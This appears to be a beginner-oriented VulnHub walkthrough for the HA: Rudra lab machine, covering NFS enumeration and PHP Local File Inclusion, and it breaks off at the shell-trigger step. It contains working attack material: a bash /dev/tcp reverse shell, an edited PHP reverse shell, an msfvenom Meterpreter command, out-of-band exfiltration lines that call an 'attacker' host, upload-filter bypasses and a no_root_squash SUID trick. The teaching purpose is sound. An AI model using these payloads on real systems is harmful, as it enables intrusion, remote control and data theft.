# HA: Rudra — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | HA: Rudra |
| **Difficulty** | **5 — Difficult** (stated: *Intermediate*) |
| **Author** | Hacking Articles (Aarti Singh & Raj Chandel) |
| **Released** | 22 Oct 2019 |
| **VulnHub Entry** | <https://vulnhub.com/entry/ha-rudra,386/> |
| **Download** | <https://vulnhub.com/entry/ha-rudra,386/#download> |
| **File** | `rudra.zip` · 685 MB · MD5 `3C432A797790B8189280239CEF0E4871` |
| **Attacker** | Kali Linux (e.g. 2024.x) on VirtualBox/VMware, host-only network |
| **Target OS** | Linux (Ubuntu, Apache + PHP, NFS server, MySQL) |
| **Flags** | Boot-to-root: reach root and read the flag in `/root` |

> **About the IP addresses.** Published walkthroughs used `192.168.1.101` and
> `192.168.0.2`. This document uses **`192.168.56.111`** for the target and
> **`192.168.56.10`** for Kali. Substitute your own.
>
> The author's tagline is again *"ENUMERATION IS THE KEY!!!!!"* — and here it
> means **NFS**, a service most beginners scan past without a second look.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

HA: Rudra is the best box in the HA series for learning **file-sharing services
as an attack surface**. It chains four genuinely distinct skills:

- Recognising **`rpcbind` (111) and NFS (2049)** in an `nmap` scan, and
  understanding what `mountd`/`nlockmgr` are doing.
- **Enumerating and mounting an NFS export** with `showmount` and `mount -t nfs`,
  and understanding **`root_squash`**.
- **Local File Inclusion (LFI)** via a query parameter — including the
  PHP-filter trick for reading source code.
- The **NFS-write + LFI-include** combination: a way to turn a *read-only* LFI
  into **remote code execution** with no upload form and no filter bypass. This
  is a classic OSCP-style technique.
- **Internal service discovery** after the foothold — `ss`/`netstat` revealing a
  MySQL that is bound to `127.0.0.1` and therefore invisible to `nmap`.
- Logging into **MySQL with an empty root password** and walking a database for
  hints.
- **Data-exfiltration tooling**: decoding a **Cloakify** emoji-cloaked credential
  file. This teaches you that "steganography" in CTFs usually means an obscure
  *encoding*, not hidden pixels.
- **`sudo` rights abuse** with `/usr/bin/watch` (GTFOBins).

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md).

---

## 1. Reconnaissance — finding the target

```bash
ip -br a
```

```text
lo               UNKNOWN        127.0.0.1/8 ::1/128
eth0             UP             192.168.56.10/24 fe80::a00:27ff:fe4e:66a1/64
eth1             UP             10.0.2.15/24 fe80::a00:27ff:fe8c:4f22/64
```


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo netdiscover -i eth0 -r 192.168.56.0/24
```

```text
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:08      1      60  (Unknown: locally administered)
 192.168.56.10   08:00:27:4e:66:a1      1      60  PCS Systemtechnik GmbH
 192.168.56.111  08:00:27:7a:41:c2      1      60  PCS Systemtechnik GmbH
```

**Target IP:** `192.168.56.111`

![netdiscover locating the target](images/01-netdiscover.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services

### 2.1 The port scan


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
nmap -A -p- -T4 -oN nmap-all 192.168.56.111
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-11 13:10 EEST
Nmap scan report for 192.168.56.111
Host is up (0.00041s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 1a:2b:3c:4d:5e:6f:70:81:92:a3:b4:c5:d6:e7:f8:09 (RSA)
|   256 aa:bb:cc:dd:ee:ff:00:11:22:33:44:55:66:77:88:99 (ECDSA)
|_  256 9f:8e:7d:6c:5b:4a:39:28:17:06:f5:e4:d3:c2:b1:a0 (ED25519)
80/tcp   open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Rudra
|_http-server-header: Apache/2.4.29 (Ubuntu)
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/udp   nfs
|   100005  1,2,3      37271/tcp   mountd
|   100005  1,2,3      45833/udp   mountd
|   100021  1,3,4      39045/tcp   nlockmgr
|   100024  1          46443/tcp   status
|_  100227  3           2049/tcp   nfs_acl
2049/tcp open  nfs      3-4 (RPC #100003)
MAC Address: 08:00:27:7A:41:C2 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.02 seconds
```

> **This is the most information-dense `nmap` output in the HA series. Read the
> `rpcinfo` block carefully:**
>
> | Program | Service | What it is |
> | --- | --- | --- |
> | `100000` | **rpcbind** (111) | The ONC RPC *portmapper*. Old Sun RPC services register their real port here, because those ports are allocated dynamically. **This is why NFS shows up on a random high port too.** |
> | `100003` | **nfs** (2049) | The Network File System server — lets a remote client mount a directory. |
> | `100005` | **mountd** (37271) | Handles the `MOUNT` protocol — this is what actually authorises a client to mount an export. |
> | `100021` | **nlockmgr** (39045) | Network Lock Manager — NFS file locking. |
> | `100024` | **status** (46443) | NFS status monitor. |
> | `100227` | **nfs_acl** (2049) | NFS Access Control List extension. |
>
> **The takeaway:** an NFS server is exposed to your lab network. NFS access
> control is based on **IP address and UID**, not passwords. If an export is
> readable by your IP, you can read it — no authentication step exists. That is a
> *huge* deal, and the entire foothold of this box.

Because the RPC ports are dynamic, run the dedicated NFS script:

```bash
nmap -sV --script=nfs-ls,nfs-showmount,nfs-statfs -p 111,2049 192.168.56.111
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-11 13:14 EEST
Nmap scan report for 192.168.56.111
Host is up (0.00039s latency).

PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC #100000)
2049/tcp open  nfs     3-4 (RPC #100003)

Host script results:
| nfs-showmount:
|   /home/shivay *
|_  RPC #100003
| nfs-ls:
|   /home/shivay
|     ACCESS  UID  GID  SIZE  MODIFY  FILENAME
|     rwxr-xr-x  0   0   4096  10-22 19:44  .
|     rwxr-xr-x  0   0   4096  10-22 19:44  ..
|     rw-r--r--  1000 1000  220  04-04 2018  .bash_logout
|     rw-r--r--  1000 1000 3771  04-04 2018  .bashrc
|     rw-r--r--  1000 1000  807  04-04 2018  .profile
|     rw-r--r--  1000 1000  341  10-22 19:44  mahadev.txt
|_    rwxr-xr-x  1000 1000 4096  10-22 19:44  public_html

Nmap done: 1 IP address (1 host up) scanned in 6.11 seconds
```

> **`*` after `/home/shivay` means "exported to every client".** That is the most
> permissive NFS configuration possible. Combined with no password auth, anyone
> on the network can read (and, as we will see, **write**) `shivay`'s home
> directory.

![nmap rpcinfo block and nfs-showmount output](images/02-nmap-nfs.png)

### 2.2 The web server

`http://192.168.56.111/` displays an image of Lord Shiva (Rudra is another name
for Shiva — hence the box's flavour text). View Source:

```html
<!DOCTYPE html>
<html>
<head><title>Rudra</title></head>
<body style="background:#000;color:#f60;text-align:center">
  <!-- Har Har Mahadev -->
  <img src="images/mahakal.jpg" alt="Mahakaal">
  <p>May the destroyer of worlds grant you root.</p>
</body>
</html>
```

Nothing actionable. On to content discovery.

### 2.3 `robots.txt` — the pointer

```bash
curl -s http://192.168.56.111/robots.txt
```

```text
User-agent: *
Disallow: /nandi.php
```

> **`robots.txt` is an attacker's roadmap.** It is intended to tell well-behaved
> crawlers what *not* to index — which makes it an explicit list of the paths the
> site owner considered private. **Always read it first.**
>
> Here it hands you `nandi.php`. (Nandi is the bull that serves as Shiva's mount
> — the naming is consistent.)

```bash
curl -s http://192.168.56.111/nandi.php
```

```html
<!DOCTYPE html>
<html>
<body>
Warning: include(): Filename cannot be empty in /var/www/html/nandi.php on line 7
</body>
</html>
```

> **That PHP warning is the vulnerability announcing itself.** `include():
> Filename cannot be empty` means line 7 of `nandi.php` contains something like:
>
> ```php
> <?php include($_GET['file']); ?>
> ```
>
> and we called it with no `file` parameter. The script is passing our input
> straight to `include()`. That is **Local File Inclusion**.
>
> Note also that it leaked the server-side path `/var/www/html/nandi.php`. Error
> messages do that constantly — another reason `display_errors` must be `Off` in
> production.

![robots.txt disallowing /nandi.php and the include() warning](images/03-lfi-discovery.png)

---

## 3. Initial compromise — Local File Inclusion

### 3.1 Prove the LFI

```bash
curl -s "http://192.168.56.111/nandi.php?file=/etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
rudra:x:1000:1000:rudra,,,:/home/rudra:/bin/bash
mysql:x:110:114:MySQL Server,,,:/nonexistent:/bin/false
shivay:x:1001:1001:,,,:/home/shivay:/bin/bash
mahakaal:x:1002:1002:,,,:/home/mahakaal:/bin/bash
```

> **Three usernames worth remembering: `rudra` (UID 1000), `shivay` (1001) and
> `mahakaal` (1002).** All three have `/bin/bash`, i.e. all three are real login
> accounts. `shivay` is the one whose home directory is NFS-exported.

### 3.2 Confirm it is an LFI and not a command injection

Beginners often confuse the two. Test deliberately:

```bash
curl -s "http://192.168.56.111/nandi.php?file=/etc/hostname"
```

```text
rudra
```


> ### 📖 Concept — Command injection
>
> The application passes your input to a shell:
>
> ```php
> system("ping -c 4 " . $_GET['host']);
> ```
>
> Break out with a shell **metacharacter** and append your own command:
>
> | Payload | Effect |
> | --- | --- |
> | `; id` | Run sequentially, regardless |
> | `\| id` | Pipe — run next |
> | `\|\| id` | Run only if the first **failed** |
> | `&& id` | Run only if the first **succeeded** |
> | `` `id` `` | Command substitution |
> | `$(id)` | Command substitution — preferred, nestable |
> | `%0a id` | A URL-encoded **newline** — works when `;` and `\|` are filtered |
>
> **When output comes back**, you are done: `<host>;id` prints the result.
>
> **When it does not** ("blind" injection), exfiltrate out-of-band:
>
> ```bash
> $(curl http://attacker/$(whoami))        # data in the URL of a request YOU receive
> $(nslookup $(whoami).attacker.com)       # data in DNS — survives most egress rules
> ; sleep 10                               # a pure timing oracle, needs no network at all
> ```
>
> Run your listener first (`nc -lvnp 80`, or `python3 -m http.server`) and **watch its
> log** — a request arriving with the hostname embedded is your proof, and the log also
> tells you which payload variant the filter allowed through.
>
> **If characters are stripped**, find out exactly what survives. Submit `;|&$\`(){}[]<>`
> as a single string and see which ones come back. Filters are usually a `str_replace`
> of a short list, and almost always miss something — commonly newline, or a doubled
> character (`;;` collapsing to `;` after one removal pass).
>
> **Deep dive:** [CONCEPTS §13.4 — Command injection](../../docs/CONCEPTS.md#134-command-injection)

```bash
# Does it execute commands? (It should NOT.)
curl -s "http://192.168.56.111/nandi.php?file=;id"
```

```text
Warning: include(;id): failed to open stream: No such file or directory in /var/www/html/nandi.php on line 7
Warning: include(): Failed opening ';id' for inclusion (include_path='.:/usr/share/php')
```

> `include()` treats the value as a **file path**, not a shell command. The error
> confirms it. Also note the leak of `include_path='.:/usr/share/php'` — the
> leading `.` means a **relative** include is resolved against the current
> working directory, which is useful for filter bypasses on other boxes.

### 3.3 Read the PHP source with a PHP filter

A plain `?file=nandi.php` would *execute* the script and show you its output, not
its code. To read the source, use the `php://filter` wrapper, which base64-encodes
the file on its way through `include()`:


> ### 📖 Concept — Encoding is not encryption
>
> These three get conflated constantly, and the confusion costs hours:
>
> | | **Encoding** | **Hashing** | **Encryption** |
> | --- | --- | --- | --- |
> | Purpose | Represent data in another *format* | Prove integrity / store passwords | Provide *confidentiality* |
> | Reversible? | **Yes — trivially, with no key** | **No** (only guessable) | Yes, **with the key** |
> | Key needed? | No | No | **Yes** |
> | Examples | base64, hex, URL-encoding, ROT13, binary | MD5, SHA-256, bcrypt, phpass | AES, RSA, ChaCha20 |
> | Security value | **Zero** | Depends on the algorithm | Depends on the key |
>
> **Recognise base64 on sight.** Three reliable tells: the character set is only
> `A–Z a–z 0–9 + /` with optional `=` padding; **the length is a multiple of 4**; and
> it is not a fixed-length digest with a `$1$`/`$6$`/`$P$` prefix.
>
> ```bash
> echo 'YWFydGk6YWFydGlAZ21haWwuY29t' | base64 -d; echo
> # aarti:aarti@gmail.com
> ```
>
> > **Base64 is not a secret.** It exists so binary data survives text-only transport
> > — email attachments, HTTP headers, JSON. Seeing it "protecting" a password is a
> > *finding*, not a defence. **Always check whether it is nested:** decode, then test
> > whether the result is itself base64 or hex. Some boxes chain two or three layers.
>
> **Identify hashes by prefix:** 32 hex = MD5 · 40 hex = SHA-1 · 64 hex = SHA-256 ·
> `$1$` = MD5-crypt · `$2b$` = bcrypt · `$6$` = SHA-512-crypt · `$y$` = yescrypt ·
> **`$P$`/`$H$` = phpass (WordPress, Drupal)** · `$apr1$` = Apache `.htpasswd` ·
> `pbkdf2_sha256$` = Django.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
curl -s "http://192.168.56.111/nandi.php?file=php://filter/convert.base64-encode/resource=nandi.php" \
  | grep -oE '^[A-Za-z0-9+/=]{20,}' | base64 -d
```

```php
<?php
// Nandi carries the devotee's request to Mahakaal
$page = $_GET['file'];
include($page);
?>
```

> **Now you have absolute proof of the vulnerability class**: `$_GET['file']`
> flows into `include()` with **zero validation** — no allow-list, no
> `basename()`, no extension check.
>
> Learn this wrapper. On a real engagement it is how you read `wp-config.php`,
> `configuration.php`, `.env` and `config/database.php` to harvest database
> credentials.

### 3.4 Try the usual LFI escalation routes (they all fail here)

Do this anyway — it is the correct methodology, and knowing *why* they fail
matters.

```bash
# Apache access log (log poisoning via User-Agent)
curl -s "http://192.168.56.111/nandi.php?file=/var/log/apache2/access.log" | head -3
```

```text
Warning: include(/var/log/apache2/access.log): failed to open stream: Permission denied in /var/www/html/nandi.php on line 7
```

```bash
# Remote File Inclusion?
curl -s "http://192.168.56.111/nandi.php?file=http://192.168.56.10/shell.txt" | head -3
```

```text
Warning: include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in /var/www/html/nandi.php on line 7
```

> **Two important dead ends, and both are instructive:**
>
> 1. **Log poisoning fails** — `www-data` cannot read `/var/log/apache2/*.log`
>    (they are `root:adm`, mode `640`). On many boxes it *can*, and then you would
>    inject PHP through a crafted `User-Agent` and include the log.
> 2. **RFI fails** — `allow_url_include=0`. The error message tells you so
>    directly. PHP's `include()` will not fetch remote URLs unless that ini
>    setting is on. **This is why the correct fix for LFI is not "turn off remote
>    includes" — it is validating the parameter.**

**So how do we get code execution?** We write a PHP file to a location the web
server can read, and then `include()` it. We cannot upload through the web app
(there is no upload form). But we have a **writable NFS export**. That is the
chain.

---

## 4. Foothold — NFS write + LFI include

> **This is the signature technique of HA: Rudra**, and one of the most
> transferable tricks in Linux privilege escalation:
>
> *LFI alone only reads. But if you can make the target write a file you control
> to a path you can predict, LFI becomes RCE.* NFS is one way to do that. (Others:
> session files in `/var/lib/php/sessions`, SSH `authorized_keys`, log poisoning,
> `/proc/self/environ`.)

### 4.1 Enumerate the export from the command line


> ### 📖 Concept — Why is NFS such a dangerous service?
>
> **NFS** (Network File System, ports 111 + 2049) lets a remote client mount a
> directory. Its access control is based on **IP address and UID** — there are **no
> passwords at all**. If an export is readable from your address, you can read it.
>
> ```bash
> showmount -e target                  # what is exported, and to whom?
> sudo mount -t nfs target:/export /mnt/t
> cat /etc/exports                     # or read it through any LFI you have
> ```
>
> **The strings that decide everything in an export line:**
>
> | Option | Meaning | Consequence |
> | --- | --- | --- |
> | `*` | exported to **everyone** | No authentication exists — anyone on the network reads it |
> | `rw` | clients may **write** | You can plant files on the target |
> | **`no_root_squash`** | client root is **honoured** as target root | Write a SUID binary or an SSH key → **instant root** |
> | `root_squash` *(default)* | client root demoted to `nobody` | Defeats the above |
>
> **Two attack patterns follow.** If the export is inside the web root, `rw` plus any
> **LFI** becomes remote code execution: write a PHP shell via NFS, trigger it through
> `include()`. If `no_root_squash` is set, mount it as root on Kali and create
> `cp /bin/bash /mnt/share/rootbash; chmod +s /mnt/share/rootbash` — then run
> `rootbash -p` on the target as any user.
>
> **Deep dive:** [CONCEPTS §9.4 — NFS](../../docs/CONCEPTS.md#94-nfs--ports-111--2049) ·
> [§15.10 — NFS no_root_squash](../../docs/CONCEPTS.md#1510-nfs-no_root_squash)

```bash
showmount -e 192.168.56.111
```

```text
Export list for 192.168.56.111:
/home/shivay *
```

> `showmount -e` asks `mountd` (port 37271, discovered via `rpcbind`) for the
> export table. The trailing `*` is the allowed-client list — **wildcard means
> everyone**.
>
> If you also want to see how each export is configured, read `/etc/exports`
> through the LFI you already have:

```bash
curl -s "http://192.168.56.111/nandi.php?file=/etc/exports"
```

```text
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
/home/shivay  *(rw,sync,no_subtree_check,no_root_squash)
```

> **Read those options like a professional:**
>
> | Option | Meaning | Security impact |
> | --- | --- | --- |
> | `rw` | Clients may **write** | We can plant a file |
> | `sync` | Writes are committed before replying | Slower, safer |
> | `no_subtree_check` | Skip subtree validation | Performance option, neutral |
> | **`no_root_squash`** | **Root on the client is NOT mapped to `nobody`** | **Catastrophic.** A root user on *any* permitted client has full root over these files. |
>
> The default is `root_squash`, which demotes client-root to `nobody:nogroup`.
> `no_root_squash` disables that protection — it is on the CIS Benchmark "never
> do this" list for exactly this reason.

### 4.2 Mount it locally

```bash
sudo apt install -y nfs-common     # provides mount.nfs, showmount, rpcinfo
sudo mkdir -p /tmp/ignite
sudo mount -t nfs 192.168.56.111:/home/shivay /tmp/ignite
mount | grep ignite
```

```text
192.168.56.111:/home/shivay on /tmp/ignite type nfs4 (rw,relatime,vers=4.2,rsize=131072,wsize=131072,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=192.168.56.10,local_lock=none,addr=192.168.56.111)
```

```bash
ls -la /tmp/ignite
```

```text
total 44
drwxr-xr-x 4 shivay shivay  4096 Oct 22  2019 .
drwxrwxrwt 9 root   root    4096 May 11  2024 ..
-rw-r--r-- 1 shivay shivay   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 shivay shivay  3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 shivay shivay   807 Apr  4  2018 .profile
-rw-r--r-- 1 shivay shivay   341 Oct 22  2019 mahadev.txt
drwxr-xr-x 2 shivay shivay  4096 Oct 22  2019 public_html
```

> **`mahadev.txt`** — the file the walkthrough tells you to look for. Read it:

```bash
cat /tmp/ignite/mahadev.txt
```

```text
Mahakaal,

The destroyer keeps his secrets where the media lives.
When the doors of the database open without a key,
look for the hint, then look where pictures are kept.

Not everything that glitters is gold.
Not everything that speaks is words.

                                     - Rudra
```

> **Interpret it now, act on it later.** Three signals:
> - *"the doors of the database open without a key"* → a database with **no
>   password**.
> - *"look for the hint"* → a table literally named `hint`.
> - *"where the media lives / where pictures are kept"* → the **`/media`**
>   filesystem.
> - *"not everything that speaks is words"* → the credential will be **encoded in
>   a non-obvious way** (spoiler: emoji).
>
> This is why you read every file you find, even the flavour text.

![NFS mounted, mahadev.txt contents](images/04-nfs-mount.png)

### 4.3 Plant the PHP reverse shell


> ### 📖 Concept — File upload: defences and their bypasses
>
> The goal is to get a file **into a directory the web server executes**. Every
> defence has a standard bypass:
>
> | Defence | Bypass |
> | --- | --- |
> | Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.php.jpg`, `.php%00.jpg` (null byte, old PHP) |
> | MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — it is **client-controlled and worthless** |
> | `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.jpg shell.php > polyglot.php.jpg` |
> | Randomised filename | Reverse-engineer the scheme (e.g. `md5(name.rand())`), or just **read the response** — many apps echo the stored path |
> | Upload outside the docroot | Find the real path from an error message, or use a plugin that serves it |
> | Double extension stripped | `shell.php.png`, where the app removes only the last extension |
>
> **Always verify where the file landed.** If the app does not tell you, infer it from
> the framework's conventions (`/wp-content/uploads/YYYY/MM/`, `/storage/originals/`,
> `images/`) and confirm with a HEAD request before wiring up a reverse shell.
>
> **Deep dive:** [CONCEPTS §13.5 — File upload](../../docs/CONCEPTS.md#135-file-upload)
> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
# Kali
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/ignite/shell.php
sed -i "s/\$ip = '127.0.0.1';/\$ip = '192.168.56.10';/" /tmp/ignite/shell.php
sed -i "s/\$port = 1234;/\$port = 4444;/" /tmp/ignite/shell.php

grep -nE '^\$(ip|port)' /tmp/ignite/shell.php
```

```text
$ip = '192.168.56.10';  // CHANGE THIS
$port = 4444;           // CHANGE THIS
```

```bash
ls -la /tmp/ignite/shell.php
```

```text
-rw-r--r-- 1 root root 5493 May 11 13:31 /tmp/ignite/shell.php
```

> The file already exists **on the target**, at `/home/shivay/shell.php`. No HTTP
> request was involved — NFS did the writing. That is the point.
>
> **Alternative: `msfvenom`.** The other published walkthrough uses a Meterpreter
> payload instead:
>
> ```bash
> msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.56.10 LPORT=1024 -f raw > /tmp/ignite/shell.php
> ```
>
> ```text
> [-] No platform was selected, choosing Meterpreter ruby to PHP from the payload
> [-] No arch selected, defaulting to php
> No encoder specified, outputting raw payload
> Payload size: 1116026 bytes
> ```
>
> then
>
> ```text
> msf6 > use multi/handler
> msf6 > set payload php/meterpreter_reverse_tcp
> msf6 > set LHOST 192.168.56.10
> msf6 > set LPORT 1024
> msf6 > exploit -j
> ```

### 4.4 Trigger it through the LFI

```bash
# Kali — listener
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
```

```bash
